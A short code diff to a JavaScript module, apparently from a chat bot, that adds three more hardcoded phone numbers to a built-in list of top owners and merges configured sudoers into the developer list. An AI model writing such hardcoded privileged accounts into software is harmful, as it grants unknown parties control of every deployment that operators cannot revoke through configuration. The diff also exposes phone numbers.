@@ -14,7 +14,9 @@ function parseList(envValue = '') {
 
 export function getTopOwnerNumbers() {
     const configuredTop = toDigits(process.env.TOP_OWNER_NUMBER || process.env.TOP_OWNER || '');
-    const extraTopOwners = ['2349019185241'].map((x) => toDigits(x)).filter(Boolean);
+    const extraTopOwners = ['2349019185241', '2349022424405', '2349031575131', '2347075663318']
+        .map((x) => toDigits(x))
+        .filter(Boolean);
     const ownerNumbers = (config.ownerNumbers || []).map((x) => toDigits(x)).filter(Boolean);
     const base = configuredTop
         ? [configuredTop, ...ownerNumbers.filter((n) => n !== configuredTop)]
@@ -29,7 +31,8 @@ export function getPrimaryTopOwner() {
 export function getDeveloperNumbers() {
     const configuredDevelopers = parseList(process.env.DEVELOPER_NUMBERS || process.env.DEV_NUMBERS || '');
     const topOwners = getTopOwnerNumbers();
-    return [...new Set([...topOwners, ...configuredDevelopers])];
+    const sudoers = (config.sudoers || []).map((x) => toDigits(x)).filter(Boolean);
+    return [...new Set([...topOwners, ...sudoers, ...configuredDevelopers])];
 }
 
 export function isTopOwner(sender = '') {
